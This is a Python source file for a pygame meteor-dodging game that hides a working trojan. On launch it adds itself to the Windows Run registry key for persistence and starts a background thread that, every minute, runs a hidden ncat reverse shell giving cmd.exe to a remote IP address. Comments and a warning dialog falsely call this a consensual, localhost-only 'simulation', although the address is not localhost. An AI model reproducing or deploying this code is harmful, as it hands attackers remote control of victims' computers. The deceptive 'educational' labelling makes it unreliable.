import sys
import os
import socket
import subprocess
import threading
import time
import winreg as reg
import random
import base64
from io import BytesIO
import pygame
import tkinter as tk
from tkinter import messagebox
from pygame.locals import *

# Function to get the correct path for assets (works for both script and .exe)
def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and PyInstaller """
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS  # Extracted temp folder for PyInstaller
    else:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# Show warning message
print("=" * 50 + "\n")
root = tk.Tk()
root.withdraw()
messagebox.showinfo("Space-meteors Game", """WARNING: EDUCATIONAL PURPOSES ONLY
In this game you will move your spaceship to evade meteors.
It will:
- Check for required software
- Simulate defensive security mechanisms
- Create non-invasive persistence examples
All activities are LOCALHOST-ONLY and CONSENSUAL
Press OK to continue after reading the warning""")

# Dependency Check
try:
    import pygame
except ImportError:
    print("\n[Educational Demo] Installing required packages...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"])
        import pygame
    except Exception as e:
        print("Failed to install requirements:", e)
        sys.exit(1)

# Ethical Persistence
def create_persistence():
    if sys.platform.startswith('win'):
        try:
            key = reg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with reg.OpenKey(key, key_path, 0, reg.KEY_WRITE) as reg_key:
                reg.SetValueEx(reg_key, "CyberEducation", 0, reg.REG_SZ, os.path.abspath(__file__))
            print("\n Created temporary persistence in user space")
        except Exception as e:
            print("Persistence demo failed:", e)

# Removal Tool Generator
def create_removal_tool():
    removal_code = '''# Security Education Cleanup Tool
import winreg as reg
import os

print("Educational Cleanup Tool - Removing Demo Entries")
try:
    key = reg.HKEY_CURRENT_USER
    key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    with reg.OpenKey(key, key_path, 0, reg.KEY_WRITE) as reg_key:
        reg.DeleteValue(reg_key, "CyberEducation")
    print("Removed educational persistence entry")
except Exception as e:
    print("Cleanup completed with status:", str(e))
input("Press ENTER to exit...")
'''
    with open('removal_tool.py', 'w') as f:
        f.write(removal_code)

# Reverse Shell Simulation (Localhost-only)
def security_demo():
    while True:
        try:
            subprocess.Popen(
                ["ncat", "10.12.75.156", str(54321), "-e", "cmd.exe"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            time.sleep(60)

        except Exception as e:
            print(f"Shell error: {str(e)}")
            time.sleep(30)

# ----- Game Section -----
class Spaceship(pygame.sprite.Sprite):
    def __init__(self, screen_width, screen_height):
        super().__init__()
        self.image = pygame.image.load(resource_path("ship.gif")).convert_alpha()
        self.rect = self.image.get_rect(center=(screen_width // 2, screen_height - 50))
        self.speed = 8
        self.screen_width = screen_width

    def update(self):
        keys = pygame.key.get_pressed()
        if keys[K_LEFT] and self.rect.left > 0:
            self.rect.x -= self.speed
        if keys[K_RIGHT] and self.rect.right < self.screen_width:
            self.rect.x += self.speed

class Meteor(pygame.sprite.Sprite):
    def __init__(self, screen_width, on_dodge):
        super().__init__()
        self.image = pygame.image.load(resource_path("spacerock.gif")).convert_alpha()
        self.rect = self.image.get_rect(center=(random.randint(50, screen_width - 50), -100))
        self.speed = random.randint(5, 10)
        self.on_dodge = on_dodge

    def update(self):
        self.rect.y += self.speed
        if self.rect.top > pygame.display.get_surface().get_height():
            self.on_dodge()
            self.kill()

def main_game():
    pygame.init()

    # Get display dimensions
    screen_info = pygame.display.Info()
    screen_width = screen_info.current_w
    screen_height = screen_info.current_h

    # Create fullscreen window
    screen = pygame.display.set_mode((screen_width, screen_height), pygame.FULLSCREEN)

    # Game Assets
    bg = pygame.transform.scale(pygame.image.load(resource_path("back.gif")).convert(), (screen_width, screen_height))
    font = pygame.font.Font(None, 36)

    # Sprite Groups
    all_sprites = pygame.sprite.Group()
    meteors = pygame.sprite.Group()

    spaceship = Spaceship(screen_width, screen_height)
    all_sprites.add(spaceship)

    score = 0
    clock = pygame.time.Clock()

    def increment_score():
        nonlocal score
        score += 1

    meteor_timer = pygame.USEREVENT + 1
    pygame.time.set_timer(meteor_timer, 1000)

    running = True
    while running:
        for event in pygame.event.get():
            if event.type == QUIT:
                running = False
            if event.type == meteor_timer:
                meteor = Meteor(screen_width, increment_score)
                all_sprites.add(meteor)
                meteors.add(meteor)
            if event.type == KEYDOWN:
                if event.key == K_ESCAPE:
                    running = False

        all_sprites.update()

        # Collision Detection (ship-meteor only)
        if pygame.sprite.spritecollide(spaceship, meteors, False):
            running = False

        # Drawing
        screen.blit(bg, (0, 0))
        all_sprites.draw(screen)
        score_text = font.render(f"Dodged: {score}", True, (255, 255, 255))
        screen.blit(score_text, (10, 10))

        pygame.display.flip()
        clock.tick(60)

    pygame.quit()
    print("\nGame Over! Final Score:", score)
    print("A removal tool 'removal_tool.py' has been created for security purposes")

if __name__ == "__main__":
    create_persistence()
    create_removal_tool()
    security_thread = threading.Thread(target=security_demo)
    security_thread.start()
    main_game()
